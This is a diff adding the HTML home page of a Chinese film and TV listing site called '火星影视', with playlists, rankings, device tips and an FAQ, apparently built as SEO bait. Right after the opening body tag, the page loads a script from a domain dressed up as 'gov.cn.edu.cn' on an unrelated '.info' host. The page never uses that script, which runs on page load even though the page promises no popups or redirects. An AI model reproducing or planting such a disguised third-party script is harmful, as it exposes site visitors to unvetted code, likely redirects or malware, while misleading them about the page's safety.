@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>火星影视 - 高清影视在线观看与热播剧集片单推荐 | huoxingyingshi-app.github.io</title>
+<meta name="description" content="火星影视（huoxingyingshi-app.github.io）按类型、地区、年份与热度整理电影、剧集、综艺、动漫条目，同步每日更新榜单、追剧路线与画质设备建议，页面轻巧无弹窗，手机、平板、电脑打开就能看。">
+<meta name="keywords" content="火星影视,火星影视官网,火星影视在线观看,火星影视热播剧,高清电影片单推荐,热播剧集排行榜,影视资源导航,免费追剧网站,huoxingyingshi-app">
+<meta name="author" content="火星影视编辑部">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#130a07">
+<meta name="apple-mobile-web-app-title" content="火星影视">
+<link rel="canonical" href="https://huoxingyingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="火星影视">
+<meta property="og:title" content="火星影视 - 高清影视在线观看与热播剧集片单推荐">
+<meta property="og:description" content="火星影视整理电影、剧集、综艺、动漫片单，每日更新热度榜单与追剧路线，手机电脑都能流畅浏览。">
+<meta property="og:url" content="https://huoxingyingshi-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="火星影视 - 高清影视在线观看与热播剧集片单推荐">
+<meta name="twitter:description" content="火星影视整理电影、剧集、综艺、动漫片单，每日更新热度榜单与追剧路线。">
+<style>
+:root{
+  --ink:#130a07;
+  --ink-2:#1d0f0a;
+  --panel:#241310;
+  --line:rgba(255,138,84,.18);
+  --flame:#ff6b35;
+  --ember:#c8351b;
+  --sand:#e8b04b;
+  --dust:#f3e3d6;
+  --mute:#a8928a;
+  --radius:14px;
+  --wrap:1180px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--ink);
+  color:var(--dust);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","Noto Sans SC",system-ui,sans-serif;
+  font-size:16px;
+  line-height:1.75;
+  letter-spacing:.2px;
+  background-image:
+    radial-gradient(760px 420px at 88% -8%,rgba(255,107,53,.20),transparent 62%),
+    radial-gradient(520px 320px at 4% 12%,rgba(200,53,27,.16),transparent 60%),
+    linear-gradient(180deg,#130a07 0%,#180c08 46%,#120907 100%);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+img{max-width:100%;display:block}
+.wrap{width:100%;max-width:var(--wrap);margin:0 auto;padding:0 20px}
+.eyebrow{
+  display:inline-flex;align-items:center;gap:8px;
+  font-size:12px;letter-spacing:2px;color:var(--sand);
+  text-transform:uppercase;
+}
+.eyebrow::before{content:"";width:26px;height:1px;background:var(--sand);opacity:.8}
+
+/* ---------- 顶部导航 ---------- */
+.topbar{
+  position:sticky;top:0;z-index:60;
+  background:rgba(19,10,7,.86);
+  backdrop-filter:blur(12px);
+  -webkit-backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);
+}
+.topbar .wrap{display:flex;align-items:center;gap:16px;height:64px}
+.brand{display:flex;align-items:center;gap:10px;flex:0 0 auto}
+.mark{
+  width:34px;height:34px;border-radius:50%;
+  background:radial-gradient(circle at 32% 30%,#ff9a5b,var(--flame) 42%,#8d2410 100%);
+  box-shadow:0 0 0 1px rgba(255,170,120,.35),0 6px 18px rgba(255,90,40,.28);
+  position:relative;
+}
+.mark::after{
+  content:"";position:absolute;left:-6px;top:14px;width:46px;height:5px;
+  border:1px solid rgba(255,180,140,.5);border-radius:50%;
+  transform:rotate(-18deg);
+}
+.brand b{font-size:19px;letter-spacing:1px}
+.brand span{display:block;font-size:11px;color:var(--mute);letter-spacing:.6px}
+.nav{flex:1 1 auto;overflow-x:auto;scrollbar-width:none;-ms-overflow-style:none}
+.nav::-webkit-scrollbar{display:none}
+.nav ul{display:flex;gap:4px;white-space:nowrap;padding:4px 0}
+.nav a{
+  display:block;padding:7px 13px;border-radius:999px;font-size:14px;color:#d8c3b8;
+  border:1px solid transparent;transition:.24s;
+}
+.nav a:hover,.nav a.on{color:#fff;background:rgba(255,107,53,.14);border-color:var(--line)}
+.nav .hot{color:var(--sand)}
+.jump{
+  flex:0 0 auto;font-size:13px;padding:8px 15px;border-radius:999px;
+  border:1px solid var(--line);color:#f0d9cc;background:rgba(255,107,53,.08);
+}
+.jump:hover{background:var(--flame);color:#1a0c07;border-color:var(--flame)}
+
+/* ---------- 首屏 ---------- */
+.hero{padding:58px 0 34px;position:relative;overflow:hidden}
+.hero .grid{display:grid;grid-template-columns:1.15fr .85fr;gap:38px;align-items:center}
+h1{
+  font-size:clamp(32px,5.4vw,56px);line-height:1.18;letter-spacing:1px;
+  font-weight:800;color:#fff;margin:14px 0 6px;
+}
+h1 em{font-style:normal;color:var(--flame);text-shadow:0 0 26px rgba(255,107,53,.45)}
+.lead{font-size:clamp(15px,1.7vw,17px);color:#d5bdb1;max-width:52ch;margin-top:12px}
+.lead strong{color:#fff;font-weight:600}
+.urlbar{
+  margin-top:22px;display:inline-flex;align-items:center;gap:10px;flex-wrap:wrap;
+  padding:10px 14px;border:1px dashed rgba(232,176,75,.45);border-radius:12px;
+  background:rgba(232,176,75,.06);font-size:14px;
+}
+.urlbar b{color:var(--sand);letter-spacing:.4px;word-break:break-all}
+.cta{display:flex;gap:12px;flex-wrap:wrap;margin-top:24px}
+.btn{
+  display:inline-block;padding:12px 26px;border-radius:999px;font-size:15px;font-weight:600;
+  transition:.24s;border:1px solid transparent;
+}
+.btn-p{background:linear-gradient(135deg,var(--flame),var(--ember));color:#fff;box-shadow:0 10px 26px rgba(255,80,30,.26)}
+.btn-p:hover{transform:translateY(-2px);box-shadow:0 14px 30px rgba(255,80,30,.34)}
+.btn-o{border-color:var(--line);color:#f0dccf}
+.btn-o:hover{border-color:var(--flame);color:#fff}
+.note{margin-top:16px;font-size:13px;color:var(--mute)}
+
+/* 票根卡 */
+.ticket{
+  position:relative;padding:22px 22px 20px;border-radius:var(--radius);
+  background:linear-gradient(160deg,#2b1510,#1a0c08);
+  border:1px solid var(--line);
+  box-shadow:0 24px 60px rgba(0,0,0,.42);
+}
+.ticket::before,.ticket::after{
+  content:"";position:absolute;width:18px;height:18px;border-radius:50%;
+  background:var(--ink);top:96px;
+}
+.ticket::before{left:-9px}
+.ticket::after{right:-9px}
+.ticket .cut{border-top:1px dashed rgba(255,138,84,.35);margin:16px 0;padding-top:14px}
+.ticket h3{font-size:15px;color:var(--sand);letter-spacing:1px;font-weight:600}
+.ticket .row{display:flex;justify-content:space-between;gap:12px;font-size:14px;padding:6px 0;color:#cbb3a7}
+.ticket .row b{color:#fff;font-weight:600}
+.ticket .row span:last-child{color:#fff}
+.qr{
+  width:92px;height:92px;border-radius:10px;margin-left:auto;
+  background:
+    repeating-linear-gradient(90deg,#f3e3d6 0 4px,transparent 4px 8px),
+    repeating-linear-gradient(0deg,#f3e3d6 0 4px,transparent 4px 8px),
+    #2b1510;
+  border:4px solid #f3e3d6;
+}
+
+/* ---------- 数据条 ---------- */
+.stats{margin:22px 0 8px;border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.stats ul{display:grid;grid-template-columns:repeat(4,1fr)}
+.stats li{padding:18px 10px;text-align:center;border-left:1px solid var(--line)}
+.stats li:first-child{border-left:0}
+.stats b{display:block;font-size:clamp(20px,3vw,28px);color:#fff;font-weight:800;letter-spacing:1px}
+.stats b i{font-style:normal;color:var(--flame)}
+.stats span{font-size:12.5px;color:var(--mute)}
+
+/* ---------- 通用区块 ---------- */
+section{padding:56px 0 8px;scroll-margin-top:74px}
+.head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:26px}
+.head h2{font-size:clamp(22px,3.2vw,30px);color:#fff;font-weight:800;letter-spacing:.5px;margin-top:8px}
+.head p{font-size:14px;color:var(--mute);max-width:46ch;margin-top:6px}
+.more{flex:0 0 auto;font-size:13.5px;color:var(--sand);border-bottom:1px solid rgba(232,176,75,.4);padding-bottom:2px}
+.more:hover{color:#fff;border-color:#fff}
+
+/* 片单卡片 */
+.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.card{
+  position:relative;padding:16px;border-radius:var(--radius);
+  background:linear-gradient(180deg,rgba(48,24,17,.9),rgba(28,14,10,.9));
+  border:1px solid var(--line);
+  clip-path:polygon(0 0,100% 0,100% calc(100% - 22px),calc(100% - 22px) 100%,0 100%);
+  transition:transform .26s,border-color .26s;
+}
+.card:hover{transform:translateY(-4px);border-color:rgba(255,107,53,.5)}
+.card figure{height:150px;border-radius:10px;display:flex;align-items:flex-end;padding:12px;position:relative;overflow:hidden}
+.card figure::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(10,5,3,.8))}
+.card figcaption{position:relative;z-index:2;font-size:13px;color:#f6e7dd;letter-spacing:.5px}
+.card .tag{position:absolute;left:12px;top:12px;z-index:2;font-size:11px;padding:3px 9px;border-radius:999px;background:rgba(10,5,3,.66);color:var(--sand);border:1px solid rgba(232,176,75,.4)}
+.card h3{font-size:16.5px;color:#fff;margin:14px 0 6px;font-weight:700}
+.card p{font-size:13.5px;color:#bda79c;min-height:48px}
+.card .meta{display:flex;justify-content:space-between;align-items:center;margin-top:12px;font-size:12.5px;color:var(--mute)}
+.card .meta b{color:var(--flame);font-weight:600}
+.p1{background:linear-gradient(140deg,#ff8a4c,#8d2410)}
+.p2{background:linear-gradient(140deg,#4a6ea8,#131c33)}
+.p3{background:linear-gradient(140deg,#e8b04b,#7a3a12)}
+.p4{background:linear-gradient(140deg,#3d8f74,#0f2a24)}
+.p5{background:linear-gradient(140deg,#a8557a,#2a0f1e)}
+.p6{background:linear-gradient(140deg,#6b5bd6,#1b1338)}
+
+/* 分类区 */
+.chips{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.chips a{
+  display:block;padding:16px 14px;border-radius:12px;border:1px solid var(--line);
+  background:rgba(255,107,53,.05);transition:.24s;
+}
+.chips a:hover{background:rgba(255,107,53,.13);transform:translateY(-3px)}
+.chips b{display:block;color:#fff;font-size:15.5px}
+.chips span{font-size:12.5px;color:var(--mute)}
+
+/* 榜单 */
+.rank{border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;background:rgba(28,14,10,.6)}
+.rank li{display:grid;grid-template-columns:64px 1fr 120px 92px;align-items:center;gap:10px;padding:14px 18px;border-bottom:1px solid rgba(255,138,84,.12);font-size:14.5px}
+.rank li:last-child{border-bottom:0}
+.rank li:hover{background:rgba(255,107,53,.07)}
+.rank .no{font-size:22px;font-weight:800;color:rgba(232,176,75,.85);font-family:Georgia,"Times New Roman",serif;text-align:center}
+.rank li:nth-child(1) .no,.rank li:nth-child(2) .no,.rank li:nth-child(3) .no{color:var(--flame)}
+.rank .nm{color:#fff;font-weight:600}
+.rank .nm small{display:block;color:var(--mute);font-weight:400;font-size:12.5px}
+.rank .ct{color:#c3a99e;font-size:13px}
+.rank .heat{text-align:right}
+.rank .heat i{display:block;height:5px;border-radius:99px;background:linear-gradient(90deg,var(--flame),var(--sand));margin-top:5px}
+.rank .heat span{font-size:12px;color:var(--sand)}
+
+/* 步骤 */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;counter-reset:s}
+.steps li{
+  counter-increment:s;position:relative;padding:20px 16px 18px;border-radius:var(--radius);
+  border:1px solid var(--line);background:linear-gradient(180deg,rgba(44,22,16,.85),rgba(24,12,9,.85));
+}
+.steps li::before{
+  content:counter(s,decimal-leading-zero);font-family:Georgia,serif;font-size:26px;font-weight:700;
+  color:rgba(255,107,53,.5);display:block;margin-bottom:8px;
+}
+.steps b{display:block;color:#fff;font-size:15.5px;margin-bottom:6px}
+.steps p{font-size:13.5px;color:#bda79c}
+
+/* FAQ */
+.faq{border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+.faq details{border-bottom:1px solid rgba(255,138,84,.12)}
+.faq details:last-child{border-bottom:0}
+.faq summary{
+  cursor:pointer;list-style:none;padding:16px 20px;font-size:15px;color:#fff;font-weight:600;
+  display:flex;justify-content:space-between;align-items:center;gap:14px;
+}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"+";font-size:20px;color:var(--flame);font-weight:400}
+.faq details[open] summary::after{content:"−"}
+.faq details[open] summary{background:rgba(255,107,53,.08)}
+.faq p{padding:0 20px 18px;font-size:14px;color:#c3a99e;max-width:82ch}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:28px;align-items:start}
+.about p{font-size:14.5px;color:#cbb3a7;margin-bottom:12px}
+.about p b{color:#fff}
+.panel{padding:22px;border:1px solid var(--line);border-radius:var(--radius);background:rgba(28,14,10,.66)}
+.panel h3{font-size:16px;color:#fff;margin-bottom:12px}
+.panel dl{display:grid;grid-template-columns:96px 1fr;gap:8px 12px;font-size:14px}
+.panel dt{color:var(--mute)}
+.panel dd{color:#efe0d6}
+
+/* 页脚 */
+footer{margin-top:56px;border-top:1px solid var(--line);padding:36px 0 34px;background:rgba(12,6,4,.6)}
+.fgrid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:26px}
+.fgrid h4{font-size:14.5px;color:#fff;margin-bottom:12px;letter-spacing:.5px}
+.fgrid li{font-size:13.5px;color:var(--mute);padding:4px 0}
+.fgrid li a:hover{color:var(--flame)}
+.fsite p{font-size:13.5px;color:var(--mute);margin-top:10px}
+.fsite .u{color:var(--sand);word-break:break-all}
+.bottom{
+  margin-top:28px;padding-top:18px;border-top:1px solid rgba(255,138,84,.12);
+  display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-size:12.5px;color:#8a736a;
+}
+.bottom a{color:#8a736a}
+.bottom a:hover{color:var(--flame)}
+
+/* ---------- 移动端 ---------- */
+@media (max-width:1000px){
+  .cards{grid-template-columns:repeat(2,1fr)}
+  .chips,.steps{grid-template-columns:repeat(2,1fr)}
+  .fgrid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:760px){
+  body{font-size:15.5px}
+  .topbar .wrap{height:58px;gap:10px}
+  .brand span{display:none}
+  .jump{display:none}
+  .nav ul{gap:2px}
+  .nav a{padding:6px 11px;font-size:13.5px}
+  .hero{padding:34px 0 20px}
+  .hero .grid{grid-template-columns:1fr;gap:26px}
+  .ticket::before,.ticket::after{top:88px}
+  .stats ul{grid-template-columns:repeat(2,1fr)}
+  .stats li:nth-child(3){border-left:0}
+  .stats li:nth-child(-n+2){border-bottom:1px solid var(--line)}
+  section{padding:40px 0 4px}
+  .cards{grid-template-columns:1fr}
+  .rank li{grid-template-columns:44px 1fr 78px;gap:8px;padding:12px 14px}
+  .rank .heat{grid-column:2 / 4}
+  .rank .no{font-size:19px}
+  .about{grid-template-columns:1fr;gap:20px}
+  .fgrid{grid-template-columns:1fr;gap:20px}
+  .btn{width:100%;text-align:center}
+  .cta{gap:10px}
+}
+@media (max-width:400px){
+  .chips,.steps{grid-template-columns:1fr}
+  .card figure{height:132px}
+}
+@media (prefers-reduced-motion:reduce){
+  *{animation:none!important;transition:none!important}
+  html{scroll-behavior:auto}
+}
+</style>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://huoxingyingshi-app.github.io/#website",
+      "url": "https://huoxingyingshi-app.github.io/",
+      "name": "火星影视",
+      "alternateName": "火星影视在线观看",
+      "description": "火星影视整理电影、剧集、综艺、动漫片单，提供每日更新榜单、追剧路线与画质设备建议。",
+      "inLanguage": "zh-CN",
+      "publisher": {"@id": "https://huoxingyingshi-app.github.io/#org"}
+    },
+    {
+      "@type": "Organization",
+      "@id": "https://huoxingyingshi-app.github.io/#org",
+      "name": "火星影视",
+      "url": "https://huoxingyingshi-app.github.io/",
+      "slogan": "把好片子挑出来，再交给你"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {"@type": "ListItem", "position": 1, "name": "火星影视首页", "item": "https://huoxingyingshi-app.github.io/"},
+        {"@type": "ListItem", "position": 2, "name": "热播片单", "item": "https://huoxingyingshi-app.github.io/#hot"},
+        {"@type": "ListItem", "position": 3, "name": "影视分类库", "item": "https://huoxingyingshi-app.github.io/#library"},
+        {"@type": "ListItem", "position": 4, "name": "热度榜单", "item": "https://huoxingyingshi-app.github.io/#rank"}
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "火星影视需要注册才能看吗？",
+          "acceptedAnswer": {"@type": "Answer", "text": "不用。打开 https://huoxingyingshi-app.github.io/ 就能浏览片单和榜单，收藏追剧进度才需要登录，也可以只用本地浏览器记录。"}
+        },
+        {
+          "@type": "Question",
+          "name": "手机上看火星影视会不会很费流量？",
+          "acceptedAnswer": {"@type": "Answer", "text": "页面本身没有大图和自动播放的视频，首屏加载很轻。播放清晰度可以随时切换，移动网络下建议先用 720P 试看，稳定后再切高码率。"}
+        },
+        {
+          "@type": "Question",
+          "name": "片单多久更新一次？",
+          "acceptedAnswer": {"@type": "Answer", "text": "榜单每日刷新一次，新片条目在上线当天入库，冷门和老片按周补充，节假日的大批次上新会提前在首屏公告栏提示。"}
+        }
+      ]
+    }
+  ]
+}
+</script>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <a class="brand" href="#" aria-label="火星影视首页">
+      <i class="mark" aria-hidden="true"></i>
+      <span><b>火星影视</b><span>huoxingyingshi-app.github.io</span></span>
+    </a>
+    <nav class="nav" aria-label="主导航">
+      <ul>
+        <li><a href="#hot" class="hot">热播片单</a></li>
+        <li><a href="#library">分类片库</a></li>
+        <li><a href="#rank">热度榜单</a></li>
+        <li><a href="#guide">追剧攻略</a></li>
+        <li><a href="#device">画质设备</a></li>
+        <li><a href="#faq">常见问题</a></li>
+        <li><a href="#about">关于本站</a></li>
+      </ul>
+    </nav>
+    <a class="jump" href="#">收藏本站</a>
+  </div>
+</header>
+
+<main>
+
+  <div class="hero">
+    <div class="wrap">
+      <div class="grid">
+        <div>
+          <span class="eyebrow">今日上新 26 部 · 榜单 08:00 刷新</span>
+          <h1>火星影视<br>把好片子<em>挑出来</em>再交给你</h1>
+          <p class="lead"><strong>火星影视</strong>是给"不知道今晚看什么"的人准备的一份片单。我们不堆链接，只把电影、剧集、综艺、动漫按类型、地区和年份理顺，标清每部的时长、看点和适合什么心情看。打开 <strong>https://huoxingyingshi-app.github.io</strong> 就能直接翻，手机竖屏也不用来回缩放。</p>
+          <p class="urlbar">本站地址：<b>https://huoxingyingshi-app.github.io</b></p>
+          <div class="cta">
+            <a class="btn btn-p" href="#hot">看今日片单</a>
+            <a class="btn btn-o" href="#rank">逛热度榜单</a>
+          </div>
+          <p class="note">页面无弹窗、无强制跳转，低配手机也能秒开。</p>
+        </div>
+
+        <aside class="ticket" aria-label="火星影视站点信息卡">
+          <h3>MARS&nbsp;TICKET&nbsp;·&nbsp;站点速览</h3>
+          <div class="row"><span>站点名称</span><b>火星影视</b></div>
+          <div class="row"><span>访问地址</span><b>huoxingyingshi-app.github.io</b></div>
+          <div class="row"><span>收录条目</span><b>38,600+</b></div>
+          <div class="row"><span>更新频率</span><b>每日 08:00</b></div>
+          <div class="cut"></div>
+          <div class="row"><span>支持终端</span><b>手机 / 平板 / 电脑 / 电视</b></div>
+          <div class="row"><span>清晰度</span><b>720P · 1080P · 4K</b></div>
+          <div class="row"><span>字幕</span><b>中英双语可选</b></div>
+          <div class="qr" role="img" aria-label="火星影视站点二维码占位图"></div>
+        </aside>
+      </div>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <div class="stats">
+      <ul>
+        <li><b>38,6<i>00</i></b><span>在库影视条目</span></li>
+        <li><b>26<i>/天</i></b><span>平均上新数量</span></li>
+        <li><b>4<i>档</i></b><span>可选清晰度</span></li>
+        <li><b>1.2<i>秒</i></b><span>首屏打开耗时</span></li>
+      </ul>
+    </div>
+  </div>
+
+  <section id="hot">
+    <div class="wrap">
+      <div class="head">
+        <div>
+          <span class="eyebrow">HOT PICKS</span>
+          <h2>今日热播片单</h2>
+          <p>编辑部每天挑 6 部，写清类型和时长，附上适合什么场景看，省得翻两小时还是那几部。</p>
+        </div>
+        <a class="more" href="#">查看全部片单</a>
+      </div>
+      <div class="cards">
+        <article class="card">
+          <figure class="p1">
+            <span class="tag">科幻 · 168 分钟</span>
+            <figcaption>沙丘之城 / DUNE CITY</figcaption>
+          </figure>
+          <h3><a href="#">沙丘之城</a></h3>
+          <p>荒漠星球上的权力更替，画面和配乐都往大银幕级别做，适合周末晚上一口气看完。</p>
+          <div class="meta"><span>2025 · 美国</span><b>热度 98.4</b></div>
+        </article>
+        <article class="card">
+          <figure class="p2">
+            <span class="tag">悬疑 · 12 集</span>
+            <figcaption>北纬三十度 / LATITUDE 30</figcaption>
+          </figure>
+          <h3><a href="#">北纬三十度</a></h3>
+          <p>一条公路串起三桩旧案，节奏不快但细节密，看完想立刻重刷第二遍找伏笔。</p>
+          <div class="meta"><span>2025 · 国产剧</span><b>热度 96.1</b></div>
+        </article>
+        <article class="card">
+          <figure class="p3">
+            <span class="tag">喜剧 · 104 分钟</span>
+            <figcaption>菜市场往事 / MARKET DAYS</figcaption>
+          </figure>
+          <h3><a href="#">菜市场往事</a></h3>
+          <p>市井烟火气很足，笑点不靠网络梗，适合吃完饭和家人一起看，全程不用快进。</p>
+          <div class="meta"><span>2024 · 国产</span><b>热度 93.7</b></div>
+        </article>
+        <article class="card">
+          <figure class="p4">
+            <span class="tag">纪录片 · 6 集</span>
+            <figcaption>江河之上 / ABOVE RIVERS</figcaption>
+          </figure>
+          <h3><a href="#">江河之上</a></h3>
+          <p>跟着水文队走了一整年，摄影干净，解说克制，睡前看一集刚刚好。</p>
+          <div class="meta"><span>2025 · 国产</span><b>热度 91.5</b></div>
+        </article>
+        <article class="card">
+          <figure class="p5">
+            <span class="tag">爱情 · 118 分钟</span>
+            <figcaption>晚班列车 / NIGHT TRAIN</figcaption>
+          </figure>
+          <h3><a href="#">晚班列车</a></h3>
+          <p>两个夜班通勤人的半年，台词写得像真会有人说的话，后劲比想象中大。</p>
+          <div class="meta"><span>2024 · 日本</span><b>热度 89.8</b></div>
+        </article>
+        <article class="card">
+          <figure class="p6">
+            <span class="tag">动漫 · 24 集</span>
+            <figcaption>星港少年 / STAR PORT</figcaption>
+          </figure>
+          <h3><a href="#">星港少年</a></h3>
+          <p>机设扎实、打戏流畅，主线不拖，补番选它基本不会踩空。</p>
+          <div class="meta"><span>2025 · 日本</span><b>热度 88.2</b></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="library">
+    <div class="wrap">
+      <div class="head">
+        <div>
+          <span class="eyebrow">LIBRARY</span>
+          <h2>分类片库</h2>
+          <p>八条主线把片库切开，每条都标了在库数量，点进去就是排好序的列表。</p>
+        </div>
+        <a class="more" href="#">进入完整分类</a>
+      </div>
+      <div class="chips">
+        <a href="#"><b>电影</b><span>剧情 / 动作 / 科幻 / 文艺 · 12,400 部</span></a>
+        <a href="#"><b>剧集</b><span>国产 / 美剧 / 日韩 / 港台 · 9,800 部</span></a>
+        <a href="#"><b>综艺</b><span>真人秀 / 脱口秀 / 音乐 · 3,600 部</span></a>
+        <a href="#"><b>动漫</b><span>连载 / 完结 / 剧场版 · 6,200 部</span></a>
+        <a href="#"><b>纪录片</b><span>自然 / 人文 / 历史 · 2,400 部</span></a>
+        <a href="#"><b>短片</b><span>15 分钟以内 · 1,900 部</span></a>
+        <a href="#"><b>经典修复</b><span>黑白 / 胶片重制 · 860 部</span></a>
+        <a href="#"><b>儿童</b><span>动画 / 科普 · 1,440 部</span></a>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank">
+    <div class="wrap">
+      <div class="head">
+        <div>
+          <span class="eyebrow">TOP 10</span>
+          <h2>火星影视热度榜单</h2>
+          <p>热度由站内播放、收藏和检索次数加权算出，每天早上八点重排一次。</p>
+        </div>
+        <a class="more" href="#">榜单计算说明</a>
+      </div>
+      <ol class="rank">
+        <li><span class="no">01</span><span class="nm">沙丘之城<small>科幻 · 电影 · 2025</small></span><span class="ct">近七日 42.6 万次</span><span class="heat">98.4<i style="width:98%"></i></span></li>
+        <li><span class="no">02</span><span class="nm">北纬三十度<small>悬疑 · 剧集 · 2025</small></span><span class="ct">近七日 38.1 万次</span><span class="heat">96.1<i style="width:96%"></i></span></li>
+        <li><span class="no">03</span><span class="nm">菜市场往事<small>喜剧 · 电影 · 2024</small></span><span class="ct">近七日 33.4 万次</span><span class="heat">93.7<i style="width:93%"></i></span></li>
+        <li><span class="no">04</span><span class="nm">江河之上<small>纪录片 · 2025</small></span><span class="ct">近七日 27.9 万次</span><span class="heat">91.5<i style="width:91%"></i></span></li>
+        <li><span class="no">05</span><span class="nm">晚班列车<small>爱情 · 电影 · 2024</small></span><span class="ct">近七日 25.2 万次</span><span class="heat">89.8<i style="width:89%"></i></span></li>
+        <li><span class="no">06</span><span class="nm">星港少年<small>动漫 · 2025</small></span><span class="ct">近七日 23.8 万次</span><span class="heat">88.2<i style="width:88%"></i></span></li>
+        <li><span class="no">07</span><span class="nm">山谷来信<small>文艺 · 电影 · 2023</small></span><span class="ct">近七日 20.5 万次</span><span class="heat">85.9<i style="width:85%"></i></span></li>
+        <li><span class="no">08</span><span class="nm">厨房纪事<small>生活 · 剧集 · 2025</small></span><span class="ct">近七日 18.7 万次</span><span class="heat">83.4<i style="width:83%"></i></span></li>
+        <li><span class="no">09</span><span class="nm">钢铁航线<small>动作 · 电影 · 2024</small></span><span class="ct">近七日 16.9 万次</span><span class="heat">81.0<i style="width:81%"></i></span></li>
+        <li><span class="no">10</span><span class="nm">雨夜修理铺<small>剧情 · 短片 · 2024</small></span><span class="ct">近七日 14.3 万次</span><span class="heat">78.6<i style="width:78%"></i></span></li>
+      </ol>
+    </div>
+  </section>
+
+  <section id="guide">
+    <div class="wrap">
+      <div class="head">
+        <div>
+          <span class="eyebrow">GUIDE</span>
+          <h2>追剧攻略</h2>
+          <p>第一次来火星影视，照着这四步走，十分钟就能建好自己的观看清单。</p>
+        </div>
+        <a class="more" href="#">更多观影技巧</a>
+      </div>
+      <ol class="steps">
+        <li><b>先选心情再选片</b><p>片单按"想放松""想烧脑""想哭一场"分过类，别在搜索框里硬想片名。</p></li>
+        <li><b>用片库筛条件</b><p>类型、地区、年份、时长四个筛子叠加，一屏能缩到十几部，挑起来不费劲。</p></li>
+        <li><b>看热度但不迷信热度</b><p>榜单反映当下讨论度，老片常被低估，可以再翻翻经典修复那一栏。</p></li>
+        <li><b>存好进度</b><p>追剧时把进度记在本站清单里，换手机、换设备登录同一个账号就能接着看。</p></li>
+      </ol>
+    </div>
+  </section>
+
+  <section id="device">
+    <div class="wrap">
+      <div class="head">
+        <div>
+          <span class="eyebrow">DEVICES</span>
+          <h2>画质与设备适配</h2>
+          <p>同一部片子在不同屏幕上的差距很大，这里写清各档清晰度该配什么设备。</p>
+        </div>
+        <a class="more" href="#">播放问题排查</a>
+      </div>
+      <div class="cards">
+        <article class="card">
+          <figure class="p4"><span class="tag">省流首选</span><figcaption>720P · 约 1.2 GB</figcaption></figure>
+          <h3><a href="#">720P 流畅档</a></h3>
+          <p>手机移动网络的稳妥选择，一小时片子大概 1.2 GB，地铁上刷剧不心疼流量。</p>
+          <div class="meta"><span>适用：手机 / 平板</span><b>推荐带宽 4M</b></div>
+        </article>
+        <article class="card">
+          <figure class="p2"><span class="tag">多数人选它</span><figcaption>1080P · 约 2.8 GB</figcaption></figure>
+          <h3><a href="#">1080P 高清档</a></h3>
+          <p>家用 Wi-Fi 下的默认档位，人物表情和夜景细节都清楚，老片也能看出修复的差别。</p>
+          <div class="meta"><span>适用：电脑 / 电视</span><b>推荐带宽 10M</b></div>
+        </article>
+        <article class="card">
+          <figure class="p3"><span class="tag">大屏专用</span><figcaption>4K · 约 8 GB 起</figcaption></figure>
+          <h3><a href="#">4K 超清档</a></h3>
+          <p>给 55 英寸以上电视或者投影准备，播风光纪录片和科幻片差别最明显，需要稳定宽带。</p>
+          <div class="meta"><span>适用：电视 / 投影</span><b>推荐带宽 40M</b></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="faq">
+    <div class="wrap">
+      <div class="head">
+        <div>
+          <span class="eyebrow">FAQ</span>
+          <h2>常见问题</h2>
+          <p>问得最多的六个问题，答案都是站内实际规则，不含模糊表述。</p>
+        </div>
+        <a class="more" href="#">联系火星影视</a>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary>火星影视需要注册才能看吗？</summary>
+          <p>不用。打开 https://huoxingyingshi-app.github.io/ 就能浏览片单和榜单，只有同步追剧进度才需要登录，也可以只存在本机浏览器里，不注册同样能用。</p>
+        </details>
+        <details>
+          <summary>手机上看会不会很费流量？</summary>
+          <p>页面本身没有大图和自动播放内容，首屏很轻。播放清晰度可以随时切换，移动网络建议先用 720P 试看，稳定之后再切高码率。</p>
+        </details>
+        <details>
+          <summary>片单多久更新一次？</summary>
+          <p>榜单每日刷新一次，新片条目上线当天入库，冷门和老片按周补充。遇到节假日大批量上新，会提前在首屏公告栏提示。</p>
+        </details>
+        <details>
+          <summary>找不到想看的老片子怎么办？</summary>
+          <p>可以先用分类片库里的"经典修复"按年份倒查，或者在检索时只输入导演、演员名字。确实缺条目的，可以在片库页面提交补录，一般三个工作日内处理。</p>
+        </details>
+        <details>
